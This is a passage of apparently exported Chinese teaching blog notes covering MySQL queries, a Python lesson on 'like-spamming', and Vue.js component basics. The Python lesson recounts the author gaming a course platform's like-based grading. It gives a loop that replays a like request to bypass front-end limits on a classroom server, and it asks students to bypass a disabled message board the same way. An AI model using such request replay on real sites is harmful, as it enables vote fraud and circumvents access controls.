导出数据库mysqldump -P3307 -u root -p 数据库名 表名(表名可省略) &gt; game.sql-- 导入数据库mysql -P3307 -u root -p 数据库名 表名(表名可省略) &lt; game.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据筛选-1"><a href="#数据筛选-1" class="headerlink" title="数据筛选"></a>数据筛选</h3><table><thead><tr><th>正则表达式</th><th>作用</th></tr></thead><tbody><tr><td>.</td><td>任意一个字符</td></tr><tr><td>^</td><td>开头</td></tr><tr><td>$</td><td>结尾</td></tr><tr><td>[abc]</td><td>匹配括号里任意一个字符</td></tr><tr><td>[a-z]  [0-9]</td><td>范围内任意一个字符</td></tr><tr><td>A|B</td><td>A或者B</td></tr></tbody></table><table><thead><tr><th>聚合函数</th><th>作用</th></tr></thead><tbody><tr><td>count()</td><td>求和</td></tr><tr><td>avg()</td><td>求平均值</td></tr><tr><td>substr(str,起始位置（从1开始）,截取长度)</td><td>截取字符串</td></tr></tbody></table><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- WHERE：⽤来按照condition指定的条件过滤数据SELECT * FROM player WHERE level &gt;= 10;-- DISTINCT：去掉重复值SELECT DISTINCT sex FROM player;-- 优先级: NOT &gt; AND &gt; ORSELECT column1, column2, ... FROM table_name WHERE condition1 AND/OR condition2 AND/OR condition3;SELECT column1, column2, ... FROM table_name WHERE NOT condition;-- IN可以指定WHERE⼦句中的多个值SELECT * FROM player WHERE level IN (1,3,5);-- BETWEEN：⽤来选取介于value1和value2之间的数据范围内的值SELECT * FROM player WHERE level BETWEEN 1 AND 10;-- LIKE：⽤于在WHERE⼦句中搜索满⾜指定pattern模式的值(%表示多个字符，_表示一个字符)SELECT * FROM player WHERE name LIKE '张%';-- REGEXP：⽤于在WHERE⼦句中搜索满⾜指定pattern模式的值SELECT * FROM player WHERE name REGEXP '^张.?';-- 判空SELECT * from player WHERE email is null;SELECT * from player WHERE email is NOT null;-- ORDER BY：⽤于按照column1，column2 ...来升序或者降序排序结果集SELECT * FROM player ORDER BY level DESC,exp ASC;-- 分组聚合-- (HAVING子句用于过滤由GROUP BY子句生成的结果集,不能使用where，因为WHERE子句只能对单个行进行过滤)SELECT level,count(level) from player GROUP BY level HAVING count(level)&gt;4 ORDER BY level DESC;-- LIMIT：⽤于限定返回记录的条数。-- 返回从第10行开始的5行数据SELECT * FROM table_name  LIMIT 10, 5;-- 返回前3行数据，第一个参数不写默认从第一行开始SELECT * FROM player LIMIT 3;-- UNION：⽤于合并两个或多个SELECT⼦句的结果（并集），默认去重复，如果允许重复值，请使⽤UNION ALLSELECT * FROM player WHERE level BETWEEN 1 AND 5UNIONSELECT * FROM player WHERE gold BETWEEN 1 AND 5;-- INTERSECT：⽤于合并两个或多个SELECT⼦句的结果（交集）SELECT * FROM player WHERE level BETWEEN 1 AND 5INTERSECTSELECT * FROM player WHERE gold BETWEEN 1 AND 5;-- EXCEPT：⽤于合并两个或多个SELECT⼦句的结果（差集）SELECT column_name(s) FROM table1EXCEPTSELECT column_name(s) FROM table2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="表关联"><a href="#表关联" class="headerlink" title="表关联"></a>表关联</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- INNER JOIN：内连接SELECT * FROM player INNER JOIN equipON player.id = equip.player_id;-- LEFT JOIN：左连接SELECT * FROM player LEFT JOIN equipON player.id = equip.player_id;-- RIGHT JOIN：右连接SELECT * FROM player RIGHT JOIN equipON player.id = equip.player_id;-- FULL JOIN：全连接SELECT * FROM player FULL JOIN equipON player.id = equip.player_id;-- 下面这种写法只能实现内连接，而且先做笛卡尔积再条件筛选，性能消耗很大，不推荐SELECT * FROM player,equip where player.id = equip.player_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫之刷点赞</title>
      <link href="/2023/06/09/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E4%B9%8B%E5%88%B7%E7%82%B9%E8%B5%9E/"/>
      <url>/2023/06/09/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E4%B9%8B%E5%88%B7%E7%82%B9%E8%B5%9E/</url>
      
        <content type="html"><![CDATA[<p>感谢各位老师、领导、专家莅临指导，不胜荣幸，如有不足之处还望不吝指出，感谢！<br>我这里有一点小的想法想与大家分享。<br>各位老师手上拿到的资料，既是教案，也是学生学习的笔记，和学生看到的一样。<br>我是用markdown语法写的，然后再用hexo渲染为静态的网页，学生看到的色彩层次更丰富，代码也全部具有语法高亮效果。<br>其制作的初衷是，由于学生经常忘记带资料（或教材）来机房，三令五申始终无法杜绝这一现象。<br>一种解决方案是使用PPT，但是PPT翻过便无法回头，一些同学看得快，一些同学看得慢，还有很多同学时不时走走神。我是属于比较笨的人，常常会因PPT翻页速度太快而产生焦虑，最后干脆摆烂。虽然我现在理解教师的苦衷，课堂时间有限（特别是公开课），只能保障大部分人。在我的学生时代，我也常常走神，甚至我现在也经常上课到一半，突然忘记后面该干嘛了（包括公开课的时候）。所以我实在不忍心以这一原因去责怪学生。<br>我现在能想到的最好的方法就是制作教案笔记平台，我忘了就看看教案，学生走神了也可以看看，上面几乎有详细的步骤、解析和原理，毕竟我必须保证我自己也能通过这个东西完成任务，书写代码，如果要用到之前的知识，也可以很方便地翻出来查看。<br>我做PPT很慢，做一份PPT至少要数个小时，如果我说我太忙了实在没有时间制作PPT，不免有找借口之嫌，但是如果能有一个既能节省时间，又能达到更好效果的方法，何乐而不为呢？这样我们就可以把节省下来的时间专注于各项研究、技能训练。<br>其中还包括考试平台（学生不需要带试卷，教师不需要批卷，做完实时显示分数和答案，现场马上讲解，记忆深刻），作业上传平台（我利用学生做作业的间隙改作业，给出实时的反馈，高效利用碎片时间，学生的所有作业也会包整理保存在平台，不然一月之后准丢一半）。<br>如果有老师感兴趣，欢迎探讨。</p><h2 id="一、情境导入（5分钟）"><a href="#一、情境导入（5分钟）" class="headerlink" title="一、情境导入（5分钟）"></a>一、情境导入（5分钟）</h2><h3 id="1-辛苦一场，被别人恶意刷票击败"><a href="#1-辛苦一场，被别人恶意刷票击败" class="headerlink" title="1.辛苦一场，被别人恶意刷票击败"></a>1.辛苦一场，被别人恶意刷票击败</h3><p>事情的经过是这样的，我的研究生导师的女婿参加了一个投票的活动，每人每天可以投10票，投票这件事情我们太擅长了，我的导师的学生很多都是班主任，一发动学生和家长，每天可以投几千票，如果不是这样，谁家的亲戚朋友有这么多，我们一直以绝对的优势占据第一名，直到最后一天，有人开始动用非常规的手段了，那就是用程序刷票，短短几小时逆袭，甚至没控制好，还多超过我们一万多票，事情就是这样，大家看图吧。</p><div style="display:flex;flex-direction: row;"><img src="http://10.163.72.39:7777/image/shuazan/sz1.jpg" alt="事件起始" width="100%"><img src="http://10.163.72.39:7777/image/shuazan/sz2.jpg" alt="中途动员" width="100%"><img src="http://10.163.72.39:7777/image/shuazan/sz3.jpg" alt="别人恶意刷票" width="100%"></div><h3 id="2-umn网课平台刷赞"><a href="#2-umn网课平台刷赞" class="headerlink" title="2.umn网课平台刷赞"></a>2.umn网课平台刷赞</h3><p>在我读研期间，正赶上疫情，学校实行家里蹲大学，自己在家上网课，老师说期末成绩会参考平台的积分，积分是靠点赞获得，一个赞一分，我发这个点赞存在明显的漏洞，可以通过Python程序绕过前端验证，想点多少赞就点多少赞，以下是一些比较有趣的截图。<br><img src="http://10.163.72.39:7777/image/shuazan/sz4.jpg" alt="刷票效果" width="100%"><br><img src="http://10.163.72.39:7777/image/shuazan/sz5.jpg" alt="老师被吓到" width="80%"></p><h2 id="二、实际演示，感受效果（2分钟）"><a href="#二、实际演示，感受效果（2分钟）" class="headerlink" title="二、实际演示，感受效果（2分钟）"></a>二、实际演示，感受效果（2分钟）</h2><p>运行一下umn刷赞的程序，让学生以最直观的方式感受程序的作用，理解这节课的任务是什么。</p><blockquote><p>特别提醒：本门课是教会大家Python网络爬虫的危害，原理，及防范方法，大家学会之后切不可在网上随意刷赞，如果将刷赞用于牟利，需承担法律后果。</p></blockquote><p><strong>提问：了解了这节课的课程内容，你认为我们为什么需要学习网络爬虫？</strong></p><h2 id="三、原理讲解（3分钟）"><a href="#三、原理讲解（3分钟）" class="headerlink" title="三、原理讲解（3分钟）"></a>三、原理讲解（3分钟）</h2><p>原理其实就一句话，Python爬虫可以绕过前端，直接向服务器发送请求。<br>人通过鼠标点击点赞按钮，接着网页会发出一条请求，请求包括<strong>请求的地址</strong>，<strong>请求方式</strong>，以及<strong>请求携带的参数</strong>。<br>可以通过Python程序直接发出请求，不需要点击点赞按钮。<br>这样的好处是，直接跳过的前端的限制，因为点赞按钮只能点一次，再点的话，就是取消点赞了。<br><strong>提问：为什么人手动点赞不行，而通过程序就可以?</strong></p><h2 id="四、实验步骤（15分钟）"><a href="#四、实验步骤（15分钟）" class="headerlink" title="四、实验步骤（15分钟）"></a>四、实验步骤（15分钟）</h2><ol><li>打开<a href="http://10.163.72.39/">http://10.163.72.39</a> ，在首页中下滑，随便进入一份作业<img src="http://10.163.72.39:7777/image/shuazan/sz6.jpg" alt="步骤1" width="100%"></li><li>按F12（或者右键—检查）打开浏览器开发工具<img src="http://10.163.72.39:7777/image/shuazan/sz7.jpg" alt="步骤2" width="100%"></li><li>选中Network，然后点击点赞按钮，抓取到点赞的请求（第一个），获得请求的<strong>请求地址</strong>、<strong>请求方式</strong>和<strong>请求携带的参数</strong>。<img src="http://10.163.72.39:7777/image/shuazan/sz8.jpg" alt="步骤3" width="100%"></li><li>修改程序，将请求地址、携带参数，请求方式，填入以下的程序，并运行程序。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests       <span class="token comment"># 引入“网络请求”库</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># 循环30次（请各位同学务必不要循环得太多，服务器承受不住）</span>    url <span class="token operator">=</span> <span class="token string">'http://10.163.72.39/Task_like.php?task_id=5'</span>  <span class="token comment"># 请求的地址及携带的参数（请替换为步骤3通过实际请求获得的地址）</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 发起请求，并获得回应（请求方式为post或get，你看看步骤3中获得的请求方式应该是哪种？）</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                 <span class="token comment"># 打印网站给我们的回应，200表示成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：每人每天只能点赞15次，只要不乱点完全够用，请先阅读教案，理解之后，务必在15次点赞请求中找到请求地址、请求方式和请求携带的参数。另外用程序发请求可以实现无限点赞，但请不要使用死循环，以免大量的请求造成我服务器的崩溃，感谢各位同学🌹🌹🌹。</p></blockquote></li></ol><h2 id="五、拓展任务（10分钟）"><a href="#五、拓展任务（10分钟）" class="headerlink" title="五、拓展任务（10分钟）"></a>五、拓展任务（10分钟）</h2><p>由于上学期的骂战事件，留言板被我关闭了，最多可以发表情，请各位同学思考一下，是否可以通过我们通过刚才学习的知识，突破留言板的限制？</p><h3 id="思路提示"><a href="#思路提示" class="headerlink" title="思路提示"></a>思路提示</h3><p>还记得我们之前讲过的原理吗？<br>Python爬虫可以绕过前端，直接向服务器发送请求。<br>我们可以先按F12键打开浏览器开发工具，选中Network，然后发一个表情，捕获到网络请求，找到<strong>请求的地址</strong>，<strong>携带的参数</strong>，<strong>请求的方式</strong>。<br>请求的参数一定是我们要发送的表情，大家发现了吗？由于是中文字符，看上去乱七八糟的很像乱码，我们这部分内容替换成我们想要发送的内容，不就可以实现在留言板上自由留言了吗？<br>作为扩展任务，代码我就不提供了，套路都是一样的，大家是否能把所学的知识迁移应用到其他地方，做到触类旁通呢，相信聪明的同学们都可以完成😎<br><strong>提问：为什么人手动留言不行，而通过程序就可以?</strong></p><h2 id="六、习题练习（5分钟）"><a href="#六、习题练习（5分钟）" class="headerlink" title="六、习题练习（5分钟）"></a>六、习题练习（5分钟）</h2><p>通过几道习题巩固今天学习的知识吧<br>请同学们点击顶部导航栏上的考试、选择“Python网路之刷点赞考试”。<br>测验一下大家今天的学习效果吧</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue笔记</title>
      <link href="/2023/04/04/vue%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/04/04/vue%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="脚手架文件结构"><a href="#脚手架文件结构" class="headerlink" title="脚手架文件结构"></a>脚手架文件结构</h2><pre><code>├── node_modules ├── public│   ├── favicon.ico: 页签图标│   └── index.html: 主页面├── src│   ├── assets: 存放静态资源│   │   └── logo.png│   │── component: 存放组件│   │   └── HelloWorld.vue│   │── App.vue: 汇总所有组件│   │── main.js: 入口文件├── .gitignore: git版本管制忽略的配置├── babel.config.js: babel的配置文件├── package.json: 应用包配置文件 ├── README.md: 应用描述文件├── package-lock.json：包版本控制文件</code></pre><h2 id="关于不同版本的Vue"><a href="#关于不同版本的Vue" class="headerlink" title="关于不同版本的Vue"></a>关于不同版本的Vue</h2><ol><li>vue.js与vue.runtime.xxx.js的区别：<ol><li>vue.js是完整版的Vue，包含：核心功能 + 模板解析器。</li><li>vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</li></ol></li><li>因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。</li></ol><h2 id="vue-config-js配置文件"><a href="#vue-config-js配置文件" class="headerlink" title="vue.config.js配置文件"></a>vue.config.js配置文件</h2><ol><li>使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。</li><li>使用vue.config.js可以对脚手架进行个性化定制，详情见：<a href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></li></ol><h2 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h2><ol><li>被用来给元素或子组件注册引用信息（id的替代者）</li><li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ol><li>打标识：<code>&lt;h1 ref="xxx"&gt;.....&lt;/h1&gt;</code> 或 <code>&lt;School ref="xxx"&gt;&lt;/School&gt;</code></li><li>获取：<code>this.$refs.xxx</code></li></ol></li></ol><h2 id="props配置项"><a href="#props配置项" class="headerlink" title="props配置项"></a>props配置项</h2><ol><li><p>功能：让组件接收外部传过来的数据</p></li><li><p>传递数据：<code>&lt;Demo name="xxx"/&gt;</code></p></li><li><p>接收数据：</p><ol><li><p>第一种方式（只接收）：<code>props:['name'] </code></p></li><li><p>第二种方式（限制类型）：<code>props:{name:String}</code></p></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）：</p> <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">props</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">type</span><span class="token operator">:</span>String<span class="token punctuation">,</span> <span class="token comment">//类型</span><span class="token literal-property property">required</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//必要性</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token string">'老王'</span> <span class="token comment">//默认值</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p></blockquote></li></ol><h2 id="mixin-混入"><a href="#mixin-混入" class="headerlink" title="mixin(混入)"></a>mixin(混入)</h2><ol><li><p>功能：可以把多个组件共用的配置提取成一个混入对象</p></li><li><p>使用方式：</p><p> 第一步定义混合：</p> <pre class="line-numbers language-none"><code class="language-none">{    data(){....},    methods:{....}    ....}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 第二步使用混入：</p><p> ​    全局混入：<code>Vue.mixin(xxx)</code><br> ​    局部混入：<code>mixins:['xxx']    </code></p></li></ol><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><ol><li><p>功能：用于增强Vue</p></li><li><p>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p></li><li><p>定义插件：</p> <pre class="line-numbers language-js" data-language="js"><code class="language-js">对象<span class="token punctuation">.</span><span class="token function-variable function">install</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">Vue<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 1. 添加全局过滤器</span>    Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 2. 添加全局指令</span>    Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 3. 配置全局混入(合)</span>    Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 4. 添加实例方法</span>    <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">$myMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span>    <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$myProperty <span class="token operator">=</span> xxxx<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用插件：<code>Vue.use()</code></p></li></ol><h2 id="scoped样式"><a href="#scoped样式" class="headerlink" title="scoped样式"></a>scoped样式</h2><ol><li>作用：让样式在局部生效，防止冲突。</li><li>写法：<code>&lt;style scoped&gt;</code></li></ol><h2 id="总结TodoList案例"><a href="#总结TodoList案例" class="headerlink" title="总结TodoList案例"></a>总结TodoList案例</h2><ol><li><p>组件化编码流程：</p><p> ​    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p><p> ​    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><p> ​            1).一个组件在用：放在组件自身即可。</p><p> ​            2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</p><p> ​    (3).实现交互：从绑定事件开始。</p></li><li><p>props适用于：</p><p> ​    (1).父组件 ==&gt; 子组件 通信</p><p> ​    (2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li><li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><h2 id="webStorage"><a href="#webStorage" class="headerlink" title="webStorage"></a>webStorage</h2><ol><li><p>存储内容大小一般支持5MB左右（不同浏览器可能还不一样）</p></li><li><p>浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。</p></li><li><p>相关API：</p><ol><li><p><code>xxxxxStorage.setItem('key', 'value');</code><br>             该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</p></li><li><p><code>xxxxxStorage.getItem('person');</code></p><p> ​        该方法接受一个键名作为参数，返回键名对应的值。</p></li><li><p><code>xxxxxStorage.removeItem('key');</code></p><p> ​        该方法接受一个键名作为参数，并把该键名从存储中删除。</p></li><li><p><code> xxxxxStorage.clear()</code></p><p> ​        该方法会清空存储中的所有数据。</p></li></ol></li><li><p>备注：</p><ol><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失。</li><li>LocalStorage存储的内容，需要手动清除才会消失。</li><li><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的value获取不到，那么getItem的返回值是null。</li><li><code>JSON.parse(null)</code>的结果依然是null。</li></ol></li></ol><h2 id="组件的自定义事件"><a href="#组件的自定义事件" class="headerlink" title="组件的自定义事件"></a>组件的自定义事件</h2><ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p></li><li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p></li><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu="test"/&gt;</code>  或 <code>&lt;Demo v-on:atguigu="test"/&gt;</code></p></li><li><p>第二种方式，在父组件中：</p> <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>Demo ref<span class="token operator">=</span><span class="token string">"demo"</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'atguigu'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>test<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li><li><p>触发自定义事件：<code>this.$emit('atguigu',数据)</code>        </p></li><li><p>解绑自定义事件<code>this.$off('atguigu')</code></p></li><li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p></li><li><p>注意：通过<code>this.$refs.xxx.$on('atguigu',回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p></li></ol><h2 id="全局事件总线（GlobalEventBus）"><a href="#全局事件总线（GlobalEventBus）" class="headerlink" title="全局事件总线（GlobalEventBus）"></a>全局事件总线（GlobalEventBus）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>安装全局事件总线：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//安装全局事件总线，$bus就是当前应用的vm</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供数据：<code>this.$bus.$emit('xxxx',数据)</code></p></li></ol></li><li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。</p></li></ol><h2 id="消息订阅与发布（pubsub）"><a href="#消息订阅与发布（pubsub）" class="headerlink" title="消息订阅与发布（pubsub）"></a>消息订阅与发布（pubsub）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>使用步骤：</p><ol><li><p>安装pubsub：<code>npm i pubsub-js</code></p></li><li><p>引入: <code>import pubsub from 'pubsub-js'</code></p></li><li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span> <span class="token comment">//订阅消息</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供数据：<code>pubsub.publish('xxx',数据)</code></p></li><li><p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p></li></ol></li></ol><h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol><li>语法：<code>this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h2 id="Vue封装的过度与动画"><a href="#Vue封装的过度与动画" class="headerlink" title="Vue封装的过度与动画"></a>Vue封装的过度与动画</h2><ol><li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p></li><li><p>图示：<img src="https://img04.sogoucdn.com/app/a/100520146/5990c1dff7dc7a8fb3b34b4462bd0105" style="width:60%"></p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;transition name="hello"&gt;&lt;h1 v-show="isShow"&gt;你好啊！&lt;/h1&gt;&lt;/transition&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p></li></ol></li></ol><h2 id="vue脚手架配置代理"><a href="#vue脚手架配置代理" class="headerlink" title="vue脚手架配置代理"></a>vue脚手架配置代理</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>​    在vue.config.js中添加如下配置：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">devServer</span><span class="token operator">:</span><span class="token punctuation">{</span>  <span class="token literal-property property">proxy</span><span class="token operator">:</span><span class="token string">"http://localhost:5000"</span><span class="token punctuation">}</span><span aria-hidden="true" 